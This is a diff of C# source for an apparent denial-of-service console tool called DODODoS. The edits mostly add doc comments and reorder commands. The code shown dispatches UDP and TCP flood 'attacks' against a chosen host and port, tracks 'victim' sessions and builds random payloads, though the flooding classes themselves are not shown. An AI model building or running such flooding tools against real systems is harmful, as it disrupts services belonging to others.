@@ -60,17 +60,21 @@ namespace DODODoS
             cmd.Add("ip", new Action(GetLocalIP));
             cmd.Add("stop", new Action(Stop));
             cmd.Add("list", new Action(List));
-            cmd.Add("clear", new Action(Clear));
 
             foreach (string plugin in Directory.GetFiles(pluginPath))
             {
                 cmd.Add(Path.GetFileNameWithoutExtension(plugin), new Action(() => PlgExec(plugin)));
             }
 
+            cmd.Add("clear", new Action(Clear));
             cmd.Add("help", new Action(Help));
             cmd.Add("exit", new Action(Exit));
 
         }
+
+        /// <summary>
+        /// Prints the local IP address
+        /// </summary>
         static void GetLocalIP()
         {
             string IP4Address = String.Empty;
@@ -86,14 +90,23 @@ namespace DODODoS
 
             Console.WriteLine("My IP: " + IP4Address);
         }
+
+        /// <summary>
+        /// Exits the program
+        /// </summary>
         static void Exit()
         {
             Environment.Exit(0);
         }
+
+        /// <summary>
+        /// Clears the console
+        /// </summary>
         static void Clear()
         {
             Console.Clear();
         }
+
         /// <summary>
         /// Prints the list of commands
         /// </summary>
@@ -105,6 +118,7 @@ namespace DODODoS
                 Console.WriteLine("  " + s);
             }
         }
+
         /// <summary>
         /// Lists all current attacks
         /// </summary>
@@ -114,8 +128,6 @@ namespace DODODoS
             if (UdpVictims.Count > 0)
             {
                 Console.WriteLine("UDP sessions:");
-                /*foreach (Tuple<string, UDP> victim in UdpVictims)
-                    Console.WriteLine("   {0}", victim.Item1);*/
                 for (; count < UdpVictims.Count; count++)
                     Console.WriteLine(" {0}.  {1}", count, UdpVictims[count].Item1);
             }
@@ -125,14 +137,13 @@ namespace DODODoS
             if (TcpVictims.Count > 0)
             {
                 Console.WriteLine("TCP sessions:");
-                /*foreach (Tuple<string, TCP> victim in TcpVictims)
-                    Console.WriteLine("   {0}", victim.Item1);*/
                 for (int i = 0; i < TcpVictims.Count; count++, i++)
                     Console.WriteLine(" {0}.  {1}", count, TcpVictims[i].Item1);
             }
             else
                 Console.WriteLine("No TCP sessions.");
         }
+
         /// <summary>
         /// Starts a UDP attack
         /// </summary>
@@ -148,6 +159,7 @@ namespace DODODoS
             UdpVictims[0].Item2.Connect(host, port);
             UdpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
         }
+
         /// <summary>
         /// Starts a TCP attack
         /// </summary>
@@ -174,6 +186,7 @@ namespace DODODoS
                 TcpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
             }
         }
+
         /// <summary>
         /// Stops all running attacks
         /// </summary>
@@ -214,6 +227,7 @@ namespace DODODoS
             }
             Console.WriteLine("Session(s) stopped succesfully.");
         }
+
         /// <summary>
         /// Collects the input from the user
         /// </summary>
@@ -229,7 +243,7 @@ namespace DODODoS
             Console.Write("Random string or message? [R/M]: ");
             if (Console.ReadLine() == "r")
             {
-                Console.Write("String lenght: ");
+                Console.Write("String lenght [Bytes]: ");
                 message = Generate(Convert.ToInt32(Console.ReadLine()));
             }
             else
@@ -238,10 +252,11 @@ namespace DODODoS
                 message = Encoding.ASCII.GetBytes(Console.ReadLine());
             }
         }
+
         /// <summary>
         /// Generates a random byte array
         /// </summary>
-        /// <param name="lenght">The lenght of the array to be generated</param>
+        /// <param name="lenght">The lenght in bytes of the array to be generated</param>
         /// <returns>The array</returns>
         static byte[] Generate(int lenght)
         {
